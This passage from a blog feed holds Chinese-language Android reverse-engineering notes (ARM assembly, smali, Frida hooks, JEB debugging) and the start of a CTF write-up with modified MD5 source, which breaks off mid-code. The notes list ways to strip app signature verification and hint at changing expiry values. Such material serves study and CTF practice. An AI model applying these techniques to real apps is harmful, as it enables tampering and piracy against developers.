汇编对比研究</p>\n<p><img data-src=\"/images/image-20230713130819423.png\" alt=\"image-20230713130819423\"></p>\n<p>C:\\Users\\98762\\AppData\\Local\\Android\\Sdk\\ndk\\25.1.8937393\\toolchains\\llvm\\prebuilt\\windows-x86_64\\bin</p>\n<p>建议直接把路径加入环境变量</p>\n<p><img data-src=\"/images/image-20230713134827964.png\" alt=\"image-20230713134827964\"></p>\n<p>生成的 ELF 可执行文件就是 ARM 的可放 IDA</p>\n<p>也可以 clang -target arm-linux-android21 -S demo.i -o demo.s 得汇编代码</p>\n<p>指令，伪指令 (编译器提供，用于指导编译过程) 与符号</p>\n<p>从汇编代码到十六进制数据 (二进制文件) 就叫做汇编</p>\n<p>arm32 每个指令 4 字节</p>\n<p>ARM 是 RISC (精简指令集) 架构的</p>\n<p><img data-src=\"/images/image-20230713144140075.png\" alt=\"image-20230713144140075\"></p>\n<p><img data-src=\"/images/image-20230713144404690.png\" alt=\"image-20230713144404690\"></p>\n<p>CPSR 程序状态寄存器</p>\n<p><img data-src=\"/images/image-20230714195334674.png\" alt=\"image-20230714195334674\"></p>\n<p>r13 是堆栈寄存器，指向堆栈的栈顶</p>\n<p>r14 (lr) 一个函数的返回地址</p>\n<p>r15(pc)</p>\n<p>r0-r12 通用寄存器</p>\n<p>根据调用规则 ATPCS，程序一般都使用 FD（FullDescending）类型的数据栈（满栈）</p>\n<p>满减栈</p>\n<p>stmfd sp!,  {r1-r4} (相当于 push)</p>\n<p><img data-src=\"/images/image-20231004143920320.png\" alt=\"image-20231004143920320\"></p>\n<p>跳转指令:</p>\n<p>B 无条件跳转</p>\n<p>BL 带链接的无条件跳转</p>\n<p>BX 带状态切换的无条件跳转</p>\n<p>BLX 带链接和状态切换的无条件跳转 (BLX 指令从 ARM 指令集跳转到指令中所指定的目标地址，并将处理器的工作状态由 ARM 状态切换到 Thumb 状态)</p>\n<h2 id=\"apk结构\"><a class=\"markdownIt-Anchor\" href=\"#apk结构\">#</a> apk 结构</h2>\n<p>apk 全称 Android Package，它相当于一个压缩文件，只要在电脑上将 apk 后缀改为 zip 即可解压。</p>\n<table>\n<thead>\n<tr>\n<th>文件</th>\n<th>注释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>assets 目录</td>\n<td>存放 APK 的静态资源文件，比如视频，音频，图片等</td>\n</tr>\n<tr>\n<td>lib 目录</td>\n<td>armeabi-v7a 基本通用所有 android 设备，arm64-v8a 只适用于 64 位的 android 设备，x86 常见用于 android 模拟器，其目录下的.so 文件是 c 或 c++ 编译的动态链接库文件</td>\n</tr>\n<tr>\n<td>META-INF 目录</td>\n<td>保存应用的签名信息，签名信息可以验证 APK 文件的完整性，相当于 APK 的身份证 (验证文件是否又被修改)</td>\n</tr>\n<tr>\n<td>res 目录</td>\n<td>res 目录存放资源文件，包括图片，字符串等等，APK 的脸蛋由他的 layout 文件设计</td>\n</tr>\n<tr>\n<td>AndroidMainfest.xml 文件</td>\n<td>APK 的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息</td>\n</tr>\n<tr>\n<td>classes.dex 文件</td>\n<td>classes.dex 是 java 源码编译后生成的 java 字节码文件，APK 运行的主要逻辑</td>\n</tr>\n<tr>\n<td>resources.arsc 文件</td>\n<td>resources.arsc 是编译后的二进制资源文件，它是一个映射表，映射着资源和 id，通过 R 文件中的 id 就可以找到对应的资源</td>\n</tr>\n</tbody>\n</table>\n<p><strong>APK 的双开 (改包名)</strong></p>\n<p><strong>汉化</strong>：使用专门的工具对外文版的软件资源进行读取、翻译、修改、回写等一系列处理，使软件的菜单、对话框、提示等用户界面显示为中文，而程序的内核和功能保持不变，这个过程即为软件汉化</p>\n<p><strong>基本上字符串都是在 arsc 里，建议一键汉化，然后再润色。<br>\n少量没汉化到的字符串参考视频中的方法定位去逐个汉化。</strong></p>\n<p>注意签名校验</p>\n<h2 id=\"jni静态注册与动态注册\"><a class=\"markdownIt-Anchor\" href=\"#jni静态注册与动态注册\">#</a> JNI 静态注册与动态注册</h2>\n<p>1、按照 JNI 规范的命名规则进行查找，这种方式叫静态注册。(包名 - 类名 - 方法名 - 方法参数)<br>\n 2、调用 JNI 提供的 <code>RegisterNatives</code>  函数，将本地函数注册到 JVM 中，这种方式叫动态注册。</p>\n<h2 id=\"hook相关\"><a class=\"markdownIt-Anchor\" href=\"#hook相关\">#</a> HOOK 相关</h2>\n<h4 id=\"动静态hook\"><a class=\"markdownIt-Anchor\" href=\"#动静态hook\">#</a> 动静态 hook</h4>\n<p>动态函数：需要得到其实例（$new 或 Java.choose）, 如果是 Java.choose 则在 onMatch 进行具体操作；<br>\n静态函数：直接用 Java.use 出来的类来调用具体的静态函数即可。</p>\n<p>frida 日常使用可参考 http://www.juziss.cn/2020/11/14/Frida% E6%97% A5% E5% B8% B8% E4% BD% BF% E7%94% A8% E6%80% BB% E7% BB%93/</p>\n<p><strong>有空做 lab8-lab11</strong></p>\n<h2 id=\"什么是jvm-dalvik-art\"><a class=\"markdownIt-Anchor\" href=\"#什么是jvm-dalvik-art\">#</a> 什么是 JVM、Dalvik、ART</h2>\n<p>JVM 是 JAVA 虚拟机，运行 JAVA 字节码程序<br>\n Dalvik 是 Google 专门为 Android 设计的一个虚拟机，Dalvik 有专属的文件执行格式 dex (Dalvik executable)<br>\n Art (Android Runtime) 相当于 Dalvik 的升级版，本质与 Dalvik 无异</p>\n<h2 id=\"smali及其语法\"><a class=\"markdownIt-Anchor\" href=\"#smali及其语法\">#</a> smali 及其语法</h2>\n<p>寄存器采用 v 和 p 来命名，v 表示本地寄存器 (局部变量)，p 表示参数寄存器</p>\n<p>smali 是 Dalvik 的寄存器语言，smali 代码是 dex 反编译而来的。</p>\n<p>关键字</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>注释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>.class</td>\n<td>类名</td>\n</tr>\n<tr>\n<td>.super</td>\n<td>父类名，继承的上级类名名称</td>\n</tr>\n<tr>\n<td>.source</td>\n<td>源名</td>\n</tr>\n<tr>\n<td>.field</td>\n<td>变量</td>\n</tr>\n<tr>\n<td>.method</td>\n<td>方法名</td>\n</tr>\n<tr>\n<td>.register</td>\n<td>寄存器</td>\n</tr>\n<tr>\n<td>.end method</td>\n<td>方法名的结束</td>\n</tr>\n<tr>\n<td>public</td>\n<td>公有</td>\n</tr>\n<tr>\n<td>protected</td>\n<td>半公开，只有同一家人才能用</td>\n</tr>\n<tr>\n<td>private</td>\n<td>私有，只能自己使用</td>\n</tr>\n<tr>\n<td>.parameter</td>\n<td>方法参数</td>\n</tr>\n<tr>\n<td>.prologue</td>\n<td>方法开始</td>\n</tr>\n<tr>\n<td>.line xxx</td>\n<td>位于第 xxx 行</td>\n</tr>\n</tbody>\n</table>\n<p>数据类型对应</p>\n<table>\n<thead>\n<tr>\n<th>smali 类型</th>\n<th>java 类型</th>\n<th>注释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>V</td>\n<td>void</td>\n<td>无返回值</td>\n</tr>\n<tr>\n<td>Z</td>\n<td>boolean</td>\n<td>布尔值类型，返回 0 或 1</td>\n</tr>\n<tr>\n<td>B</td>\n<td>byte</td>\n<td>字节类型，返回字节</td>\n</tr>\n<tr>\n<td>S</td>\n<td>short</td>\n<td>短整数类型，返回数字</td>\n</tr>\n<tr>\n<td>C</td>\n<td>char</td>\n<td>字符类型，返回字符</td>\n</tr>\n<tr>\n<td>I</td>\n<td>int</td>\n<td>整数类型，返回数字</td>\n</tr>\n<tr>\n<td>J</td>\n<td>long （64 位 需要 2 个寄存器存储）</td>\n<td>长整数类型，返回数字</td>\n</tr>\n<tr>\n<td>F</td>\n<td>float</td>\n<td>单浮点类型，返回数字</td>\n</tr>\n<tr>\n<td>D</td>\n<td>double （64 位 需要 2 个寄存器存储）</td>\n<td>双浮点类型，返回数字</td>\n</tr>\n<tr>\n<td>string</td>\n<td>String</td>\n<td>文本类型，返回字符串</td>\n</tr>\n<tr>\n<td>Lxxx/xxx/xxx</td>\n<td>object</td>\n<td>对象类型，返回对象</td>\n</tr>\n</tbody>\n</table>\n<p>常用指令</p>\n<table>\n<thead>\n<tr>\n<th>关键字</th>\n<th>注释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>const</td>\n<td>重写整数属性，真假属性内容，只能是数字类型</td>\n</tr>\n<tr>\n<td>const-string</td>\n<td>重写字符串内容</td>\n</tr>\n<tr>\n<td>const-wide</td>\n<td>重写长整数类型，多用于修改到期时间。</td>\n</tr>\n<tr>\n<td>return</td>\n<td>返回指令</td>\n</tr>\n<tr>\n<td>if-eq</td>\n<td>全称 equal (a=b)，比较寄存器 ab 内容，相同则跳</td>\n</tr>\n<tr>\n<td>if-ne</td>\n<td>全称 not equal (a!=b)，ab 内容不相同则跳</td>\n</tr>\n<tr>\n<td>if-eqz</td>\n<td>全称 equal zero (a=0)，z 即是 0 的标记，a 等于 0 则跳</td>\n</tr>\n<tr>\n<td>if-nez</td>\n<td>全称 not equal zero (a!=0)，a 不等于 0 则跳</td>\n</tr>\n<tr>\n<td>if-ge</td>\n<td>全称 greater equal (a&gt;=b)，a 大于或等于则跳</td>\n</tr>\n<tr>\n<td>if-le</td>\n<td>全称 little equal (a&lt;=b)，a 小于或等于则跳</td>\n</tr>\n<tr>\n<td>goto</td>\n<td>强制跳到指定位置</td>\n</tr>\n<tr>\n<td>switch</td>\n<td>分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td>\n</tr>\n<tr>\n<td>iget</td>\n<td>获取寄存器数据</td>\n</tr>\n</tbody>\n</table>\n<p>其余指令可用语法工具查询</p>\n<p>定位方法：搜索弹窗关键字 (MT,jadx)、抓取按钮 id (开发者助手)</p>\n<p>静态分析工具:jadx</p>\n<p>修改工具：MT 管理器</p>\n<h2 id=\"activity生命周期\"><a class=\"markdownIt-Anchor\" href=\"#activity生命周期\">#</a> Activity 生命周期</h2>\n<table>\n<thead>\n<tr>\n<th>函数名称</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>onCreate()</td>\n<td>一个 Activity 启动后第一个被调用的函数，常用来在此方法中进行 Activity 的一些初始化操作。例如创建 View，绑定数据，注册监听，加载参数等。</td>\n</tr>\n<tr>\n<td>onStart()</td>\n<td>当 Activity 显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td>\n</tr>\n<tr>\n<td>onResume()</td>\n<td>这个方法在 onStart () 之后调用，也就是在 Activity 准备好与用户进行交互的时候调用，此时的 Activity 一定位于 Activity 栈顶，处于运行状态。</td>\n</tr>\n<tr>\n<td>onPause()</td>\n<td>这个方法是在系统准备去启动或者恢复另外一个 Activity 的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td>\n</tr>\n<tr>\n<td>onStop()</td>\n<td>这个方法是在 Activity 完全不可见的时候调用的。</td>\n</tr>\n<tr>\n<td>onDestroy()</td>\n<td>这个方法在 Activity 销毁之前调用，之后 Activity 的状态为销毁状态。</td>\n</tr>\n<tr>\n<td>onRestart()</td>\n<td>当 Activity 从停止 stop 状态恢进入 start 状态时调用状态。</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"动态调试步骤\"><a class=\"markdownIt-Anchor\" href=\"#动态调试步骤\">#</a> 动态调试步骤</h2>\n<h3 id=\"1修改debug权限\"><a class=\"markdownIt-Anchor\" href=\"#1修改debug权限\">#</a> 1. 修改 debug 权限</h3>\n<p>方法一：在 AndroidManifest.xml 里添加可调试权限</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>复制代码 隐藏代码</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>android:debuggable=\"true\"</pre></td></tr></table></figure><p>方法二：XappDebug 模块 hook 对应的 app</p>\n<p>项目地址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1BhbGF0aXMvWEFwcERlYnVn\">XappDebug</span></p>\n<h3 id=\"2端口转发以及开启adb权限\"><a class=\"markdownIt-Anchor\" href=\"#2端口转发以及开启adb权限\">#</a> 2. 端口转发以及开启 adb 权限</h3>\n<h3 id=\"3下段点\"><a class=\"markdownIt-Anchor\" href=\"#3下段点\">#</a> 3. 下段点</h3>\n<p>ctrl+b 下断点</p>\n<h3 id=\"4debug模式启动\"><a class=\"markdownIt-Anchor\" href=\"#4debug模式启动\">#</a> 4.debug 模式启动</h3>\n<pre><code class=\"language-avrasm\"> 复制代码 隐藏代码\nadb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity\n</code></pre>\n<p>adb shell am start -D -n<br>\nadb shell am start -D -n 包名 / 类名<br>\n am start -n 表示启动一个 activity<br>\nam start -D 表示将应用设置为可调试模式</p>\n<h3 id=\"5jeb附加调试进程\"><a class=\"markdownIt-Anchor\" href=\"#5jeb附加调试进程\">#</a> 5.Jeb 附加调试进程</h3>\n<p>快捷键：<br>\nR 运行到光标处</p>\n<h2 id=\"log插桩\"><a class=\"markdownIt-Anchor\" href=\"#log插桩\">#</a> Log 插桩</h2>\n<p>定义：Log 插桩指的是反编译 APK 文件时，在对应的 smali 文件里，添加相应的 smali 代码，将程序中的关键信息，以 log 日志的形式进行输出。</p>\n<p>调用命令</p>\n<figure class=\"highlight smali\"><figcaption data-lang=\"smali\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>invoke-static <span class=\"token punctuation\">&#123;</span>对应寄存器<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">com<span class=\"token punctuation\">/</span>mtools<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">LogUtils</span></span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">v</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">java<span class=\"token punctuation\">/</span>lang<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">Object</span></span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token builtin\">V</span></pre></td></tr></table></figure><h2 id=\"签名校验\"><a class=\"markdownIt-Anchor\" href=\"#签名校验\">#</a> 签名校验</h2>\n<p>如何判断是否有签名校验？<br>\n不做任何修改，直接签名安装，应用闪退则说明大概率有签名校验</p>\n<figure class=\"highlight lua\"><figcaption data-lang=\"lua\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>kill<span class=\"token operator\">/</span>killProcess<span class=\"token comment\">-----kill/KillProcess () 可以杀死当前应用活动的进程，这一操作将会把所有该进程内的资源（包括线程全部清理掉）. 当然，由于 ActivityManager 时刻监听着进程，一旦发现进程被非正常 Kill，它将会试图去重启这个进程。这就是为什么，有时候当我们试图这样去结束掉应用时，发现它又自动重新启动的原因.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>system<span class=\"token punctuation\">.</span>exit<span class=\"token comment\">----- 杀死了整个进程，这时候活动所占的资源也会被释放。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>finish<span class=\"token comment\">---------- 仅仅针对 Activity，当调用 finish () 时，只是将活动推向后台，并没有立即释放内存，活动的资源并没有被清理</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> 所谓三角校验，就是so检测dex，动态加载的<span class=\"token function\">dex</span><span class=\"token punctuation\">(</span>在软件运行时会解压释放一段dex文件，检测完后就删除<span class=\"token punctuation\">)</span>检测so，dex检测动态加载的dex</pre></td></tr></table></figure><h2 id=\"签名校验对抗\"><a class=\"markdownIt-Anchor\" href=\"#签名校验对抗\">#</a> 签名校验对抗</h2>\n<p>方法一：核心破解插件，不签名安装应用<br>\n方法二：一键过签名工具，例如 MT、NP、ARMPro、CNFIX、Modex 的去除签名校验功能<br>\n方法三：具体分析签名校验逻辑 (手撕签名校验)</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/07/20/HWSCTF-WP/",
            "url": "https://3cly.github.io/2023/07/20/HWSCTF-WP/",
            "title": "HWSCTF_WP",
            "date_published": "2023-07-20T15:24:20.000Z",
            "content_html": "<h1 id=\"hwsctf\"><a class=\"markdownIt-Anchor\" href=\"#hwsctf\">#</a> HWSCTF</h1>\n<p>没有官方 WP💢😠</p>\n<p>出了一道 animals, 另外两道是赛后看大佬 WP 复现的，一道安卓一道流量分析 <s>主要是太摆了…</s></p>\n<h2 id=\"animals\"><a class=\"markdownIt-Anchor\" href=\"#animals\">#</a> Animals</h2>\n<p><img data-src=\"/images/image-20230715091543873.png\" alt=\"image-20230715091543873\"></p>\n<p><img data-src=\"/images/image-20230715093301804.png\" alt=\"image-20230715093301804\"></p>\n<p><img data-src=\"/images/image-20230715094922589.png\" alt=\"image-20230715094922589\"></p>\n<p>去花指令</p>\n<p><img data-src=\"/images/image-20230715161145193.png\" alt=\"image-20230715161145193\"></p>\n<p><img data-src=\"/images/image-20230716122739861.png\" alt=\"image-20230716122739861\"></p>\n<p><img data-src=\"/images/image-20230716124344765.png\" alt=\"image-20230716124344765\"></p>\n<p><img data-src=\"/images/image-20230716190031257.png\" alt=\"image-20230716190031257\"></p>\n<p><img data-src=\"/images/image-20230716190118487.png\" alt=\"image-20230716190118487\"></p>\n<p>[+] Dump 0x608090 - 0x60809F (16 bytes) :</p>\n<p>[0xDD, 0xB2, 0x6D, 0xF3, 0xE6, 0x0A, 0xC7, 0x83, 0x4A, 0x93, 0x50, 0xB4, 0xA4, 0x59, 0xAB, 0x0E]</p>\n<p>魔改哈希算法</p>\n<p><img data-src=\"/images/image-20230716154457847.png\" alt=\"image-20230716154457847\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;memory.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"md5.h\"</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> PADDING<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                         <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                         <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                         <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                         </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Init</span><span class=\"token punctuation\">(</span>MD5_CTX <span class=\"token operator\">*</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>     context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>     context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>     context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0xEFCDAB89</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>     context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x67452301</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>     context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x10325476</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>     context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x98BADCFE</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Update</span><span class=\"token punctuation\">(</span>MD5_CTX <span class=\"token operator\">*</span>context<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>input<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> inputlen<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>partlen <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    partlen <span class=\"token operator\">=</span> <span class=\"token number\">64</span> <span class=\"token operator\">-</span> index<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> inputlen <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>inputlen <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>       context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> inputlen <span class=\"token operator\">>></span> <span class=\"token number\">29</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>inputlen <span class=\"token operator\">>=</span> partlen<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>       <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>context<span class=\"token operator\">-></span>buffer<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>input<span class=\"token punctuation\">,</span>partlen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>       <span class=\"token function\">MD5Transform</span><span class=\"token punctuation\">(</span>context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">,</span>context<span class=\"token operator\">-></span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>       <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> partlen<span class=\"token punctuation\">;</span>i<span class=\"token operator\">+</span><span class=\"token number\">64</span> <span class=\"token operator\">&lt;=</span> inputlen<span class=\"token punctuation\">;</span>i<span class=\"token operator\">+=</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>           <span class=\"token function\">MD5Transform</span><span class=\"token punctuation\">(</span>context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>       index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span 